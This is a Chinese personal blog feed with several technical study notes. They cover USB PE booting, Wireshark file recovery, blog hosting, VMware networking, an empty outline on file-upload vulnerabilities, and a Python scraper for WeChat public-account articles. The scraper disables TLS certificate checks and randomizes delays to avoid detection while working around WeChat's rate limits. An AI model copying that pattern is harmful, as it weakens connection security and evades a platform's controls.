              <div class="tag link"><a class="link-card" title="CSDN" href="https://blog.csdn.net/qq_29508575/article/details/121907625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164706370216780271515153%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164706370216780271515153&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121907625.article_score_rank&amp;utm_term=u%E7%9B%98%E5%90%AF%E5%8A%A8&amp;spm=1018.2226.3001.4187"><div class="left"><img src="https://s2.loli.net/2022/02/17/K6VzyT4a71xntAU.png"></div><div class="right"><p class="text">CSDN</p><p class="url">https://blog.csdn.net/qq_29508575/article/details/121907625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164706370216780271515153%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164706370216780271515153&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121907625.article_score_rank&amp;utm_term=u%E7%9B%98%E5%90%AF%E5%8A%A8&amp;spm=1018.2226.3001.4187</p></div></a></div>
              </div>
            </details>
<p>在虚拟机测试运行PE系统，进Boot，选择U盘启动。</p>
<p><img src="https://img.anineg.space//202203121323385.png" alt="图片3"></p>
<ul>
<li>提供了两种系统，两种默认分辨率选择。</li>
</ul>
<p><img src="https://img.anineg.space//202203121325358.png" alt="图片4"></p>
<ul>
<li>进入PE系统桌面。</li>
</ul>
<p><img src="https://img.anineg.space//202203121326465.png" alt="图片5"></p>
<ul>
<li>PE系统的资源管理器</li>
</ul>
<p><img src="https://img.anineg.space//202203121327257.png" alt="图片6"></p>
<ul>
<li>DiskGenius软件PE版，可以对磁盘进行修改备份修复等。</li>
</ul>
<p><img src="https://img.anineg.space//202203121328507.png" alt="图片7"></p>
<ul>
<li>PE系统还提供了大量工具。</li>
</ul>
<p><img src="https://img.anineg.space//202203121328423.png" alt="图片8"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python网络爬虫之微信公众号（待改进）</title>
    <url>/2023/05/31/pypachong/</url>
    <content><![CDATA[<h1>前言</h1>
<p>近日得到一任务：需要爬取某个公众号的文章并保存到本地，然后进行分析。那么对于公众号爬取确实是比较少见而且有点难度，在搜集资料后，结合网络文章的经验以及自己的改进，实现了这一功能。参考文章会在文末列出。</p>
<h1>准备</h1>
<ul>
<li>Python环境</li>
<li>电脑或是服务器</li>
<li>一个自己能登陆的微信公众号</li>
</ul>
<h1>批量获取公众号推送链接</h1>
<p>由于公众号的每一篇文章的链接似乎是随机生成的，相互之间没有关联，因此要批量获取某公众号的文章链接需要用到一定的方法，搜狗微信只能获取到最近的几篇文章，并不能做到全部收录。这里就需要用到自己的微信公众号的后台了。</p>
<p>登录<a href="https://mp.weixin.qq.com/">微信公众平台</a>，新建文章，点击超链接。此时打开浏览器的检查模式，选择<code>网络(Network)</code>，然后在窗口中选择你要爬取的公众号。</p>
<h2 id="获取fakeid和token">获取fakeid和token</h2>
<p><img src="https://img.anineg.space/pypachong1.png" alt=""></p>
<p>这时我们可以看到，<code>网络</code>中出现了一个“<code>appmsg</code>”开头的内容，这就是我们需要的目标。将它的请求URL记录在下面（*隐去了部分内容）：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/cgi-bin/appmsg?action=list_ex&amp;begin=0&amp;count=5&amp;fakeid=MzI2********Mw==&amp;type=9&amp;query=&amp;token=465***914lang=zh_CN&amp;f=json&amp;ajax=1</span><br></pre></td></tr></tbody></table></figure>
<p>该链接分为三部分：</p>
<ol>
<li><code>https://mp.weixin.qq.com/cgi-bin/appmsg</code> 请求的基础部分</li>
<li><code>?action=list_ex</code> 常用于动态网站，实现不同的参数值而生成不同的页面或者返回不同的结果</li>
<li><code>&amp;begin=0&amp;count=5&amp;fakeid=MzI2MTE0NTE3Mw==&amp;type=9&amp;query=&amp;token=465219914&amp;lang=zh_CN&amp;f=json&amp;ajax=1</code> 设置各种参数，我们需要的就是用到这里的<code>fakeid=MzI2********Mw==</code>以及<code>token=465***914</code></li>
</ol>
<h2 id="获取浏览器Cookie和User-Agent">获取浏览器Cookie和User-Agent</h2>
<p>在python运行时，我们需要它能以登录的状态去访问该URL。因此需要找到我们浏览器保存的Cookie和User-Agent：</p>
<p>开浏览器的检查模式，选择<code>文档(Document)</code>。此时刷新网页，就可以看到一个“<code>home</code>”开头的内容：</p>
<p><img src="https://img.anineg.space/pypachong3.png" alt=""></p>
<p>从这里我们可以获得Cookie和User-Agent参数。</p>
<p><img src="https://img.anineg.space/pypachong4.png" alt=""></p>
<h2 id="保存为yaml文件方便加载">保存为yaml文件方便加载</h2>
<p>将上述四个参数保存至一个<code>wechat.yaml</code>文件中，方便后面在python中加载。</p>
<p>文件内容：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cookie : RK=P/Pd1qTtZk; ptcz......</span><br><span class="line">user_agent : Mozilla/5.0......</span><br><span class="line">fakeid : MzI2.......</span><br><span class="line">token : 2023483153......</span><br></pre></td></tr></tbody></table></figure>
<h2 id="URL爬取">URL爬取</h2>
<p>这部分主要参考了<a href="https://zhuanlan.zhihu.com/p/379062852">@Author:YuFanWenShu</a>的代码：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载参数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"wechat.yaml"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> file: <span class="comment">#将上文的wechat.yaml放在同一文件夹</span></span><br><span class="line">    file_data = file.read()</span><br><span class="line">config = yaml.safe_load(file_data)</span><br><span class="line"></span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">"Cookie"</span>: config[<span class="string">'cookie'</span>],</span><br><span class="line">    <span class="string">"User-Agent"</span>: config[<span class="string">'user_agent'</span>]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求参数</span></span><br><span class="line">url = <span class="string">"https://mp.weixin.qq.com/cgi-bin/appmsg"</span></span><br><span class="line">begin = <span class="string">"0"</span></span><br><span class="line">params = {</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"list_ex"</span>,</span><br><span class="line">    <span class="string">"begin"</span>: begin,</span><br><span class="line">    <span class="string">"count"</span>: <span class="string">"5"</span>,</span><br><span class="line">    <span class="string">"fakeid"</span>: config[<span class="string">'fakeid'</span>],</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"9"</span>,</span><br><span class="line">    <span class="string">"token"</span>: config[<span class="string">'token'</span>],</span><br><span class="line">    <span class="string">"lang"</span>: <span class="string">"zh_CN"</span>,</span><br><span class="line">    <span class="string">"f"</span>: <span class="string">"json"</span>,</span><br><span class="line">    <span class="string">"ajax"</span>: <span class="string">"1"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放结果</span></span><br><span class="line">app_msg_list = []</span><br><span class="line"><span class="comment"># 在不知道公众号有多少文章的情况下，使用while语句</span></span><br><span class="line"><span class="comment"># 也方便重新运行时设置页数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"app_msg_list.csv"</span>, <span class="string">"w"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"文章标识符aid,标题title,链接url,时间time\n"</span>)</span><br><span class="line">page = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    begin = page * <span class="number">5</span></span><br><span class="line">    params[<span class="string">"begin"</span>] = <span class="built_in">str</span>(begin)</span><br><span class="line">    <span class="comment"># 随机暂停几秒，避免过快的请求导致过快的被查到</span></span><br><span class="line">    time.sleep(random.randint(<span class="number">1</span>, <span class="number">10</span>))</span><br><span class="line">    resp = requests.get(url, headers=headers, params=params, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 微信流量控制, 退出</span></span><br><span class="line">    <span class="keyword">if</span> resp.json()[<span class="string">'base_resp'</span>][<span class="string">'ret'</span>] == <span class="number">200013</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"frequencey control, stop at {}"</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(begin)))</span><br><span class="line">        time.sleep(<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果返回的内容中为空则结束</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(resp.json()[<span class="string">'app_msg_list'</span>]) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"all ariticle parsed"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    msg = resp.json()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"app_msg_list"</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> msg[<span class="string">"app_msg_list"</span>]:</span><br><span class="line">            info = <span class="string">'"{}","{}","{}","{}"'</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(item[<span class="string">"aid"</span>]), item[<span class="string">'title'</span>], item[<span class="string">'link'</span>], <span class="built_in">str</span>(item[<span class="string">'create_time'</span>]))</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"app_msg_list.csv"</span>, <span class="string">"a"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(info + <span class="string">'\n'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"第<span class="subst">{page}</span>页爬取成功\n"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n"</span>.join(info.split(<span class="string">","</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n\n---------------------------------------------------------------------------------\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 翻页</span></span><br><span class="line">    page += <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
<p>经测试，每爬取大约200篇文章会遇到流量限制，此时需要等待一小时左右。一个账号一天最多只能爬取1000篇左右，我在这里测试的时候，是在大约1200篇的时候停下了，可能需要一天甚至更长的时间才能继续…</p>
<h1>将爬取的文章批量下载至本地（待改进）</h1>
<p>使用<code>pdfkit</code>将文章转为PDF，可能需要安装：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pip install pdfkit</span><br><span class="line">pip install bs4</span><br><span class="line">pip install html5lib</span><br></pre></td></tr></tbody></table></figure>
<p>还需要安装一个工具：<a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf下载链接</a></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选项</span></span><br><span class="line">options = {</span><br><span class="line">    <span class="string">'page-size'</span>: <span class="string">'A4'</span>,</span><br><span class="line">    <span class="comment">#     'margin-top': '0.75in',</span></span><br><span class="line">    <span class="comment">#     'margin-right': '0.75in',</span></span><br><span class="line">    <span class="comment">#     'margin-bottom': '0.75in',</span></span><br><span class="line">    <span class="comment">#     'margin-left': '0.75in',</span></span><br><span class="line">    <span class="string">'encoding'</span>: <span class="string">"UTF-8"</span>,</span><br><span class="line">    <span class="comment"># "enable-local-file-access": True,</span></span><br><span class="line">    <span class="comment">#      'custom-header': headers,</span></span><br><span class="line">    <span class="comment">#     'debug-javascript': [''],</span></span><br><span class="line">    <span class="comment">#     'javascript-delay': 10000,</span></span><br><span class="line">    <span class="comment">#     'no-stop-slow-scripts': "",</span></span><br><span class="line">    <span class="comment">#     'load-media-error-handling': 'abort',</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">path_wkthmltopdf = <span class="string">r'C:\Program Files\wkhtmltopdf\bin\wkhtmltopdf.exe'</span></span><br><span class="line">config = pdfkit.configuration(wkhtmltopdf=path_wkthmltopdf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换特殊字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_title</span>(<span class="params">title</span>):</span><br><span class="line">    rstr = <span class="string">r"[\/\\\:\*\?\"\&lt;\&gt;\|]"</span>  <span class="comment"># '/ \ : * ? " &lt; &gt; |'</span></span><br><span class="line">    new_title = re.sub(rstr, <span class="string">"_"</span>, title)  <span class="comment"># 替换为下划线</span></span><br><span class="line">    new_title = new_title.replace(<span class="string">'：'</span>, <span class="string">' _'</span>)</span><br><span class="line">    new_title = new_title.replace(<span class="string">'？'</span>, <span class="string">'_'</span>)</span><br><span class="line">    <span class="keyword">return</span> new_title</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"D:\\turn-to-pdf\\app_msg_list.csv"</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    <span class="comment"># next(reader)  # 跳过CSV文件的表头行</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        aid, title, url, time = row</span><br><span class="line">        <span class="keyword">if</span> url.find(<span class="string">'mp.weixin.qq.com'</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'此内容发送失败无法查看'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># data-src替换为src 有时候返回的正文被隐藏了，将hidden去掉</span></span><br><span class="line">            html = res.text.replace(<span class="string">"data-src"</span>, <span class="string">"src"</span>).replace(<span class="string">'style="visibility: hidden;"'</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">            soup = BeautifulSoup(html, features=<span class="string">"html5lib"</span>)</span><br><span class="line">            <span class="comment"># 选择正文（去除javascrapt等）</span></span><br><span class="line">            html = soup.select(<span class="string">'div#img-content'</span>)[<span class="number">0</span>]</span><br><span class="line">            html = <span class="built_in">str</span>(html).replace(<span class="string">"font-family: 仿宋;"</span>, <span class="string">""</span>)</span><br><span class="line">            output = title + <span class="string">'.pdf'</span></span><br><span class="line">            pdfkit.from_string(<span class="built_in">str</span>(html), output, configuration=config, options=options)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"<span class="subst">{i}</span>:<span class="subst">{title}</span> 已完成"</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Skipping <span class="subst">{url}</span> because it's not from WeChat."</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>这一步有很多奇怪的问题，比如如果原文中有仿宋字体的话，在转成PDF后全部都不能正常显示。于是在转为PDF之前将HTML中的所有仿宋全部替换为默认字体。</p>
<p><img src="https://img.anineg.space/pypachong5.png" alt=""></p>
<p>这一部分还有诸多问题没有解决，但目前小部分的转换应该没有太大问题。偶尔还会遇到一些报错，暂时也还没有解决。如果各位大佬有办法，欢迎在评论区留言！</p>
<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
              <div class="content">
              <div class="tag link"><a class="link-card" title="用Python爬取指定公众号所有文章" href="https://zhuanlan.zhihu.com/p/379062852"><div class="left"><img src="https://img.anineg.space/zhihu.png"></div><div class="right"><p class="text">用Python爬取指定公众号所有文章</p><p class="url">https://zhuanlan.zhihu.com/p/379062852</p></div></a></div><div class="tag link"><a class="link-card" title="【Python】将微信收藏的文章批量导出为pdf" href="https://blog.csdn.net/qq_32832803/article/details/122508085"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【Python】将微信收藏的文章批量导出为pdf</p><p class="url">https://blog.csdn.net/qq_32832803/article/details/122508085</p></div></a></div>
              </div>
            </details>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>分享会</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>个人博客入坑实录</title>
    <url>/2022/01/12/start/</url>
    <content><![CDATA[<h3 id="🏃‍♂️这是一个强迫症建设网站的辛酸历程"><s>🏃‍♂️这是一个强迫症建设网站的辛酸历程</s></h3>
<h3 id="👨‍🦽这是一段令人心酸的网站建设历程">👨‍🦽这是一段令人心酸的网站建设历程</h3>
<hr>
<h1>✏第一天：2022.1.11</h1>
<p>放假在家n天，闲来无事，恰巧<a href="https://cgrona.top/">风清竹喧</a>同学在建个人博客，便决心一起入坑。经过几十分钟的研究，解决了域名注册以及GitHub仓库的建设。当天晚上，临时使用了GitHub自带的主题模板：</p>
<p><img src="https://s2.loli.net/2022/01/17/QkuBvtf36zNTUY8.png" alt="202201161728985" title="初始界面"></p>
<p>没错…</p>
<p>它很丑，而且自由度可玩性很低，至少不是我能接受的结果。</p>
<p>参考文章：<a href="https://sspai.com/post/54608">GitHub Pages 搭建教程</a></p>
<hr>
<h1>✏第二天：2022.1.12</h1>
<p>在经过了解相关知识后，最终决定采用Hexo + GitHub 的方式来搭建免费个人博客网站。</p>
<p>不做详细介绍，简单叙述下：</p>
<h3 id="GitHub-Pages-是什么？"><strong>GitHub Pages 是什么？</strong></h3>
<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
<h3 id="Hexo-是什么？"><strong>Hexo 是什么？</strong></h3>
<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
<h3 id="Hexo-GitHub-文章发布原理"><strong>Hexo + GitHub 文章发布原理</strong></h3>
<p>在本地撰写 Markdown 格式文章后，通过 Hexo 解析文档，渲染生成具有主题样式的 HTML 静态网页，再推送到 GitHub 上完成博文的发布。</p>
<h3 id="优点和不足"><strong>优点和不足</strong></h3>
<p>优点：完全免费；静态站点，轻量快速；可按需求自由定制改造；托管在 GitHub，安全省心；迁移方便……</p>
<p>不足：发文不便，依赖于本地环境；更适合个人博客使用；GitHub 在国内访问速度有点不快。（但实际上速度还是可以接受的，除了图片，真的很慢，建议将图片放图床，后面会讲到）</p>
<p>一切都搞定后，它大概是长这个样子的⬇⬇⬇</p>
<p><img src="https://s2.loli.net/2022/01/17/DjrMYknOSEcyzQu.jpg" alt="202201161921239"></p>
<p>比昨天的好看多了！但是还是没有让人那么满意…</p>
<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></p>
<hr>
<h1>✏第三，四天：2022.1.13-14</h1>
<p>后来经了解，发现了原来hexo是有很多主题可以用的，在这个时候我选择了Next主题来升级我的页面。</p>
<p>整个过程不算难，跟着教程来一步步地很快就完成了。但最大的问题出在了后期的美化上。我使用的Next是8.9.0的版本，而网上大多数教程都是7.x甚至6.x的版本。据说在7.5后Next的文件结构是做了一些改动的，有人称它为“移除了custom文件的神奇跨时代版本”，这一点我在实际操作的时候真的是感同身受…</p>
<p>但困难总比办法多嘛，在我的不懈努力之下，我发现了一位大佬的博客，其中里面详细叙述了各种文件改动以及解决方法，最终花了大概两天的时间，我的博客终于变成了我想要的样子：</p>
<p><img src="https://s2.loli.net/2022/01/17/n7Z1Q2cCpVgai9w.jpg" alt="202201161953425"></p>
<p>除了应用网上的各种教程以外，还可以去好好研究研究主题配置文件，使用 hexo s 命令一边改一边看效果，往往会有意想不到的效果。因为主题的版本越高，它往往内置的插件越多，所以很多东西并不需要去 npm install 的。</p>
<p>参考文章：</p>
<p>​	<a href="http://theme-next.iissnan.com/getting-started.html">安装 NexT</a></p>
<p>​	<a href="https://blog.csdn.net/Growing_potato/article/details/113926856">next主题美化</a></p>
<p>​	<a href="https://blog.csdn.net/C_acgl/article/details/86555826">Hexo优化</a></p>
<p>​	<a href="https://www.jianshu.com/p/f054333ac9e6">打造炫酷网站</a></p>
<p>​	<a href="https://zhuanlan.zhihu.com/p/251383216">next8.0主题美化</a></p>
<p>​	<a href="https://tding.top/archives/2bd6d82.html">大佬的文章</a></p>
<p>​	<a href="https://hexo-next.readthedocs.io/zh_CN/latest/">Hexo-NexT说明书</a></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP协议传输数据还原测试</title>
    <url>/2022/10/04/tcptest/</url>
    <content><![CDATA[<details class="folding-tag" yellow=""><summary> 相关原理： </summary>
              <div class="content">
              <p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，我们这里只做简单、形象的介绍，你只要做到能够理解这个过程即可。我们来看看这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数据。</p><p>QQ的文件发送是怎样的过程呢？通常，发送文件的计算机首先要通过消息服务器将其IP地址发送给接收计算机，当接收计算机同意接收的确认消息反馈到消息服务器后，消息服务器将据此设置好文件传输对话。随即，发送计算机与接收计算机就会在确定好的端口范围内，建立起TCP或UDP连接开始文件的检索与传输。</p><p>在默认状态下，QQ优先采用了UDP（User Data Protocol，用户数据报协议）协议传送数据，而对可靠性要求高的数据通讯系统往往使用TCP协议传输数据。与TCP协议不同，UDP协议并不提供数据传送的验证机制——在整个文件传输过程中如果出现数据报的丢失，协议本身并不能作出任何的检测或提示。因此，通常人们把UDP协议称为不可靠的传输协议。 UDP协议适用于无须应答、要求时效的软件使用，这样的设计正好与QQ追求的目标相符，所以QQ优先使用了此协议进行一切功能应用。但是，由于UDP协议具有不可靠性，常会因种种原因导致消息或数据的发送失败（很多时候会发现发送文件给对方接收时，对方根本收不到要求接收文件的消息。或是发送聊天消息时，对方根本没有收到过消息）。显然，UDP协议由于排除了信息可靠传递机制，将安全和排序等功能移交给上层应用来完成，极大降低了执行时间，使速度得到了保证。QQ在数据传输上更注重实际性能，为了获得更好的使用效果，往往可以牺牲一定的可靠性。因此，使用QQ来传输数据，在很多时候就成了一个“不错”的选择。（来自互联网）</p>
              </div>
            </details>
<h1>测试环境：</h1>
<p>将手机与电脑连接至同一局域网中。</p>
<ul>
<li>
<p>手机IP:<code>192.168.31.216</code></p>
<p><img src="https://img.anineg.space/3454545.png" alt="Screenshot_20221004_140105"></p>
</li>
<li>
<p>电脑IP:<code>192.168.31.182</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004140012.png" alt="QQ截图20221004140012"></p>
</li>
</ul>
<h1>Wireshark抓包</h1>
<p>启动WireShark，选择WLAN过滤器：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004132831.png" alt="QQ截图20221004132831"></p>
<p>在过滤器中输入：<code>ip.src == 192.168.31.216</code>以捕获/过滤指定ip地址（手机）数据包。</p>
<p><img src="https://img.anineg.space/12345664556.png" alt="12345664556"></p>
<p>此时，我们在手机上发送一张图片给电脑，我们可以看到Wireshark捕获了大量数据包。其中这一项就是我们刚刚发送的图片：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135150.png" alt="QQ截图20221004135150"></p>
<p>右键，选择“追踪流=&gt;TCP流”</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135442.png" alt="QQ截图20221004135442"></p>
<p>数据格式选择“原始数据”，然后将其另存为新文件。</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135514.png" alt="QQ截图20221004135514"></p>
<h1>数据还原</h1>
<p>使用16进制编辑器（如WinHex）打开文件，找到jpg格式图片的文件头<code>FF D8 FF</code>,并把文件头前面的数据删除：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135748.png" alt="QQ截图20221004135748"></p>
<p>保存后，将文件后缀改为<code>.jpg</code>，至此，文件得以还原：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135901.png" alt="QQ截图20221004135901"></p>
<div class="tag link"><a class="link-card" title="文件头标识及对应类型表" href="https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表："><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">文件头标识及对应类型表</p><p class="url">https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表：</p></div></a></div>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2022/03/25/upload/</url>
    <content><![CDATA[<h1>什么是文件上传漏洞</h1>
<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<h1>前端JS过滤绕过</h1>
<h1>文件名过滤绕过</h1>
<h1>Content-Type过滤绕过</h1>
<h1>文件头过滤绕过</h1>
<h1>.htaccess文件上传</h1>
<h1>文件截断上传</h1>
<h1>竞争条件文件上传</h1>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>使用Vercel+Github搭建个人博客</title>
    <url>/2022/02/15/vercel/</url>
    <content><![CDATA[<h1>前言</h1>
<p>相信在座的各位应该都试过用<code>Github Pages</code>来搭建个人博客，但效果却总是不不尽如人意，访问速度实在是太太太太慢了。</p>
<p>想要提升速度，我们可以使用<a href="https://vercel.com/">Vercel</a>来给博客加速。</p>
<p><a href="https://vercel.com/">Vercel</a>类似于github page，但远比github page强大，速度也快得多得多，而且将Github授权给vercel后，可以达到最优雅的发布体验，只需将代码轻轻一推，项目就自动更新部署了。</p>
<h1>教程</h1>
<h2 id="注册Vercel账号">注册Vercel账号</h2>
<h4 id="打开https-vercel-com-，点击Login。">打开<code>https://vercel.com/</code>，点击<code>Login</code>。</h4>
<h4 id="点击Continue-with-Github，直接用GitHub账户登录。">点击<code>Continue with Github</code>，直接用GitHub账户登录。</h4>
<h4 id="点击New-Project">点击<code>New Project</code></h4>
<h4 id="点击Add-Github-Account，关联至你的账号。">点击<code>Add Github Account</code>，关联至你的账号。</h4>
<h4 id="选择需要的项目，点击Import-在新的界面中选择默认选项即可。">选择需要的项目，点击<code>Import</code>,在新的界面中选择默认选项即可。</h4>
<h4 id="创建成功后，就可以看到满屏的烟花庆祝了！">创建成功后，就可以看到满屏的烟花庆祝了！</h4>
<h4 id="在Settings-Git-Production-Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。">在<code>Settings</code>-<code>Git</code>-<code>Production Branch</code>中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。</h4>
<h4 id="在Settings-Domains中，可以设置自己的域名。">在<code>Settings</code>-<code>Domains</code>中，可以设置自己的域名。</h4>
<p>到这里，页面就已经创建完成了，可以到新的域名访问了，速度有明显的提升。</p>
<h1>前后访问速度对比</h1>
<ul>
<li>GitHub线路：</li>
</ul>
<p><img src="https://s2.loli.net/2022/02/17/JKrjb1nQBz8xvAN.png" alt="2"></p>
<ul>
<li>Vercel线路：</li>
</ul>
<p><img src="https://s2.loli.net/2022/02/17/Y1zaFHEZKbSn93g.png" alt="1"></p>
<details class="folding-tag" green=""><summary> 题外话 </summary>
              <div class="content">
              <p>真的是气死了，本来是好好的一篇图文并茂的文章，但SM·MS图床一下子把图全给我删了，而且由于升级了Windows11，便把之前的图片删除了，没有备份。我这才发现SM·MS网站还写着“保留删除图片的权力”，真的是无语，连夜建了七牛云图床.所以还是要找靠谱的图床啊，一定要记得备份呐！！</p>
              </div>
            </details>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>Vercel</tag>
      </tags>
  </entry>
  <entry>
    <title>桥接模式、NAT模式和仅主机模式</title>
    <url>/2022/10/05/vmnet/</url>
    <content><![CDATA[<h1>虚拟机网络</h1>
<p>在VMware中，虚拟机的网络连接主要是由VMware创建的虚拟交换机(也叫做虚拟网络)负责实现的，VMware可以根据需要创建多个虚拟网络。</p>
<p>在Windows系统的主机上，VMware最多可以创建20个虚拟网络，每个虚拟网络可以连接任意数量的虚拟机网络设备；在Linux系统的主机上，VMware最多可以创建255个虚拟网络，但每个虚拟网络仅能连接32个虚拟机网络设备。VMware的虚拟网络都是以"VMnet+数字"的形式来命名的，例如 VMnet0、VMnet1、VMnet2……以此类推(在Linux系统的主机上，虚拟网络的名称均采用小写形式，例如 vmnet0 )。</p>
